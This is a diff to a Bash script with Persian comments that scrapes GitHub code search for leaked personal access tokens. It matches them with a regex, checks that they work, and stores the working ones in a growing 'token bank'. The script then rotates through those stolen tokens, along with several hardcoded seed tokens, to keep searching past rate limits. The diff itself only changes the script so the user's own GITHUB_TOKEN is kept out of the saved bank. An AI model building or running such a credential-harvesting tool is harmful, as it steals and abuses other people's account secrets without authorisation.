@@ -1,7 +1,7 @@
 #!/bin/bash
 set -euo pipefail
 
-# --- توکن‌های اولیه (seed) ---
+# --- توکن‌های اولیه (seed) که هاردکد هستن و می‌تونن ذخیره بشن ---
 SEED_TOKENS=(
   "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"
   "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"
@@ -11,7 +11,9 @@ SEED_TOKENS=(
 TOKEN_FILE="tokens.txt"
 
 # --- توابع ---
-load_tokens() {
+
+# بانک واقعی (بدون GITHUB_TOKEN)
+load_token_bank() {
   local tokens=()
   if [ -f "$TOKEN_FILE" ] && [ -s "$TOKEN_FILE" ]; then
     while IFS= read -r line; do
@@ -27,7 +29,7 @@ load_tokens() {
   printf '%s\n' "${tokens[@]}" | sort -u
 }
 
-save_tokens() {
+save_token_bank() {
   printf '%s\n' "$@" | sort -u > "$TOKEN_FILE"
 }
 
@@ -38,10 +40,12 @@ get_remaining() {
     jq -r '.resources.core.remaining // .rate.remaining // 0' 2>/dev/null || echo 0
 }
 
+# انتخاب بهترین توکن از آرایه‌ای که بهش میدیم
 pick_best_token() {
+  local tokens=("$@")
   local best_token=""
   local best_rem=-1
-  for token in "${TOKENS[@]}"; do
+  for token in "${tokens[@]}"; do
     local rem
     rem=$(get_remaining "$token") || continue
     echo "  Token ${token:0:12}... remaining=$rem" >&2
@@ -59,18 +63,21 @@ pick_best_token() {
 
 # --- شروع ---
 echo "[*] Loading token bank..." >&2
-mapfile -t TOKENS < <(load_tokens)
+mapfile -t BANK_TOKENS < <(load_token_bank)
+echo "Loaded ${#BANK_TOKENS[@]} tokens in bank." >&2
 
-# تزریق GITHUB_TOKEN در اولویت
+# آرایه‌ی جستجو: GITHUB_TOKEN (اگه باشه) + بانک
+SEARCH_TOKENS=()
 if [ -n "${GITHUB_TOKEN:-}" ]; then
-  TOKENS=("$GITHUB_TOKEN" "${TOKENS[@]}")
-  echo "[*] Injected GITHUB_TOKEN (primary)" >&2
+  SEARCH_TOKENS+=("$GITHUB_TOKEN")
+  echo "[*] Injected GITHUB_TOKEN for search (will NOT be saved)." >&2
 fi
+SEARCH_TOKENS+=("${BANK_TOKENS[@]}")
 
-echo "Loaded ${#TOKENS[@]} tokens." >&2
-save_tokens "${TOKENS[@]}"
+echo "Search tokens count: ${#SEARCH_TOKENS[@]}" >&2
 
-BEST_TOKEN=$(pick_best_token) || exit 1
+# انتخاب بهترین توکن برای جستجو از کل Search Array
+BEST_TOKEN=$(pick_best_token "${SEARCH_TOKENS[@]}") || exit 1
 echo "[*] Using token: ${BEST_TOKEN:0:12}..." >&2
 
 # --- جستجوی کد ---
@@ -82,36 +89,31 @@ CANDIDATES_TMP=$(mktemp)
 echo "[*] Starting code search..." >&2
 page=1
 while [ $page -le $MAX_PAGES ]; do
+  # اگر سهمیه توکن فعلی تموم شد، از آرایه جستجو یه توکن جدید انتخاب کن
   if [ "$(get_remaining "$BEST_TOKEN")" -lt 1 ]; then
-    echo "[!] Token exhausted, picking new one..." >&2
-    BEST_TOKEN=$(pick_best_token) || break
+    echo "[!] Token exhausted, picking a new one..." >&2
+    BEST_TOKEN=$(pick_best_token "${SEARCH_TOKENS[@]}") || break
   fi
 
   echo "[*] Page $page with ${BEST_TOKEN:0:12}..." >&2
-  # گرفتن هدر HTTP به همراه بدنه با -i (جدا کردنش)
   http_response=$(curl -sS -i -H "Authorization: token $BEST_TOKEN" \
     -H "Accept: application/vnd.github.text-match+json" \
     "https://api.github.com/search/code?q=$SEARCH_QUERY&per_page=$PER_PAGE&page=$page")
 
-  # جدا کردن هدر و بدنه
   http_headers=$(echo "$http_response" | awk 'BEGIN{RS="\r\n\r\n"} NR==1')
   response_body=$(echo "$http_response" | awk 'BEGIN{RS="\r\n\r\n"} NR>1')
   http_code=$(echo "$http_headers" | grep -oP '(?<=HTTP\/1\.. )\d+' || echo "000")
 
   if [ "$http_code" != "200" ]; then
-    echo "[!] HTTP $http_code received. Skipping." >&2
-    # چاپ بخشی از بدنه برای دیباگ
-    echo "Response snippet: ${response_body:0:200}" >&2
+    echo "[!] HTTP $http_code received. Response snippet: ${response_body:0:200}" >&2
     break
   fi
 
-  # استخراج matches
   matches=$(echo "$response_body" | jq -r '.items[]?.text_matches[]?.fragment // empty' 2>/dev/null || true)
   if [ -n "$matches" ]; then
     echo "$matches" | grep -oP '\bgh[po]_[A-Za-z0-9_]{36,}\b|\bgithub_pat_[A-Za-z0-9_]{22,}\b' >> "$CANDIDATES_TMP"
   fi
 
-  # استخراج total با محافظت
   total=$(echo "$response_body" | jq -r '.total_count // 0' 2>/dev/null || echo 0)
   echo "  Total results: $total, extracted fragments: $(echo "$matches" | wc -l)" >&2
 
@@ -146,11 +148,12 @@ while IFS= read -r candidate; do
 done < "$CANDIDATES_TMP"
 
 if [ -s "$VALID_TMP" ]; then
-  mapfile -t BANK < <(load_tokens)
+  # بارگذاری مجدد بانک (بدون GITHUB_TOKEN) و اضافه‌کردن توکن‌های جدید
+  mapfile -t NEW_BANK < <(load_token_bank)
   while IFS= read -r newtok; do
-    BANK+=("$newtok")
+    NEW_BANK+=("$newtok")
   done < "$VALID_TMP"
-  save_tokens "${BANK[@]}"
+  save_token_bank "${NEW_BANK[@]}"
   echo "[*] Bank updated. Size: $(wc -l < "$TOKEN_FILE")" >&2
 else
   echo "[*] No valid tokens added." >&2
